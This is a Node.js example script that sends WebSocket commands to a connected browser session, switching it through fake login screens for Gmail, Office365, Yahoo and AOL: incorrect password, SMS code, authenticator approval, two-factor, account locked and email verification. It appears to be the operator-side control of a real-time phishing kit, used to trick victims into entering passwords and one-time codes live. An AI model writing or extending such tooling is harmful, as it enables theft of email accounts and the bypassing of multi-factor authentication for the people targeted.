/**
 * Example script demonstrating how to send WebSocket commands to connected clients
 * 
 * This script should be run AFTER the server is started and a client has connected.
 * It demonstrates the various UI states that can be triggered remotely.
 * 
 * Usage:
 * 1. Start the server: npm start
 * 2. Open the frontend in a browser
 * 3. Note the sessionId from the browser console
 * 4. In another terminal: node examples/websocket-demo.js <sessionId>
 */

import { WebSocket } from 'ws';

// Get sessionId from command line arguments
const sessionId = process.argv[2];

if (!sessionId) {
  console.error('Usage: node examples/websocket-demo.js <sessionId>');
  console.error('\nExample: node examples/websocket-demo.js abc123xyz456');
  console.error('\nYou can find the sessionId in the browser console after connecting.');
  process.exit(1);
}

const PORT = process.env.PORT || 10000;
const ws = new WebSocket(`ws://localhost:${PORT}/ws?sessionId=${sessionId}`);

let demoStep = 0;

ws.on('open', () => {
  console.log(`Connected to session: ${sessionId}`);
  console.log('\nStarting demo sequence...\n');
  runDemo();
});

ws.on('message', (data) => {
  const message = JSON.parse(data.toString());
  console.log('Received:', message);
});

ws.on('error', (error) => {
  console.error('WebSocket error:', error.message);
});

ws.on('close', () => {
  console.log('Connection closed');
});

function sendCommand(command, data = {}) {
  const message = { command, data };
  console.log(`\n[${demoStep}] Sending: ${command}`);
  console.log('Data:', JSON.stringify(data, null, 2));
  ws.send(JSON.stringify(message));
  demoStep++;
}

async function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function runDemo() {
  console.log('='.repeat(60));
  console.log('WebSocket Interactive Frontend Demo');
  console.log('='.repeat(60));
  
  await wait(2000);
  
  // Demo 1: Incorrect Password
  console.log('\n--- Demo 1: Show Incorrect Password State ---');
  sendCommand('show_incorrect_password', {
    provider: 'Gmail',
    message: 'The password you entered is incorrect.'
  });
  
  await wait(5000);
  
  // Demo 2: SMS Code
  console.log('\n--- Demo 2: Show SMS Code Input ---');
  sendCommand('show_sms_code', {
    provider: 'Office365',
    phoneNumber: '+1 (***) ***-5678'
  });
  
  await wait(5000);
  
  // Demo 3: Authenticator Approval
  console.log('\n--- Demo 3: Show Authenticator Approval ---');
  sendCommand('show_authenticator_approval', {
    provider: 'Yahoo',
    appName: 'Yahoo Account Key'
  });
  
  await wait(5000);
  
  // Demo 4: Two-Factor Authentication
  console.log('\n--- Demo 4: Show Two-Factor Authentication ---');
  sendCommand('show_two_factor', {
    provider: 'Gmail'
  });
  
  await wait(5000);
  
  // Demo 5: Account Locked
  console.log('\n--- Demo 5: Show Account Locked ---');
  sendCommand('show_account_locked', {
    provider: 'AOL',
    message: 'Your account has been temporarily locked due to suspicious activity.'
  });
  
  await wait(5000);
  
  // Demo 6: Security Check
  console.log('\n--- Demo 6: Show Security Check ---');
  sendCommand('show_security_check', {
    provider: 'Office365'
  });
  
  await wait(5000);
  
  // Demo 7: Email Verification
  console.log('\n--- Demo 7: Show Email Verification ---');
  sendCommand('show_email_verification', {
    provider: 'Gmail',
    email: 'user@gmail.com'
  });
  
  await wait(5000);
  
  // Demo 8: Reset State
  console.log('\n--- Demo 8: Reset to Normal State ---');
  sendCommand('hide_state');
  
  await wait(2000);
  
  console.log('\n='.repeat(60));
  console.log('Demo completed!');
  console.log('='.repeat(60));
  
  // Close connection after demo
  setTimeout(() => {
    ws.close();
    process.exit(0);
  }, 2000);
}
